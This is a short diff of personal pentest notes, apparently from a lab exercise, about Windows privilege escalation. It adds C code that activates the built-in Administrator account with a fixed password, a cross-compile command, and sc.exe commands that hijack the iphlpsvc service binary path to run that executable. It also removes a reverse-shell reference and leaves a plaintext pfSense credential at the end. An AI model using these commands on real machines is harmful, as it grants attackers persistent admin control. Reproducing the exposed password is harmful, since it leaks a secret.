@@ -15,13 +15,29 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 . .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML
 ```
 
-rev shell from `git@github.com:Erez-Goldberg/Rust-revshell.git`, easy for cross compiling
+# Activate Admin user and set password
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    system("net user Administrator P@ssw0rd123 /active:yes");
+    return 0;
+}
+
+```
+
+compile like that:
+
+`x86_64-w64-mingw32-gcc admin.c -o admin.exe`
 
 file transfer over updog
 
 ```sh
-sc.exe config iphlpsvc binPath= "C:\Users\Jenny\Downloads\reverse_shell.exe"
+sc.exe config iphlpsvc binPath= "C:\Users\Jenny\Downloads\admin.exe"
 sc.exe stop iphlpsvc
 sc.exe start iphlpsvc
 ```
 
+
+pfsense cred: FyDRAquukjS2
